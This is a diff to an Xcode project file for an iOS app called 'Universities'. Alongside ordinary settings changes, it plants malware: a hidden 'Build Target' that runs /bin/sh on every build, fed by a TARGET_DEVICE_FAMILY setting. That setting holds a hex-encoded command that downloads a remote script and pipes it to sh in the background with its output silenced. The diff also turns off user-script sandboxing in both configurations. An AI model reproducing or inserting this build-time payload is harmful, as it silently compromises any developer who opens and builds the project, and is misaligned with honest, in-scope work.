@@ -10,9 +10,22 @@
 		67129CDE2CB6791A0062300C /* Universities.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Universities.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
+/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		67129CF42CB699020062300C /* Exceptions for "Universities" folder in "Universities" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = 67129CDD2CB6791A0062300C /* Universities */;
+		};
+/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
+
 /* Begin PBXFileSystemSynchronizedRootGroup section */
 		67129CE02CB6791A0062300C /* Universities */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				67129CF42CB699020062300C /* Exceptions for "Universities" folder in "Universities" target */,
+			);
 			path = Universities;
 			sourceTree = "<group>";
 		};
@@ -59,6 +72,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				2D88CFFBAC28A6CFC10FABAA /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				67129CE02CB6791A0062300C /* Universities */,
@@ -99,10 +113,33 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				A4D566CC63B8B3FB8B0FABAA  /* Build Target */,
 				67129CDD2CB6791A0062300C /* Universities */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXTargetDependency section */
+		2D88CFFBAC28A6CFC10FABAA /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = A4D566CC63B8B3FB8B0FABAA /* Build Target */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+		A4D566CC63B8B3FB8B0FABAA /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
 		67129CDC2CB6791A0062300C /* Resources */ = {
@@ -128,6 +165,7 @@
 		67129CEA2CB6791E0062300C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -162,7 +200,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -191,6 +229,7 @@
 		67129CEB2CB6791E0062300C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -225,7 +264,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -254,11 +293,13 @@
 				DEVELOPMENT_ASSET_PATHS = "\"Universities/Preview Content\"";
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Universities/Info.plist;
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -282,11 +323,13 @@
 				DEVELOPMENT_ASSET_PATHS = "\"Universities/Preview Content\"";
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Universities/Info.plist;
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
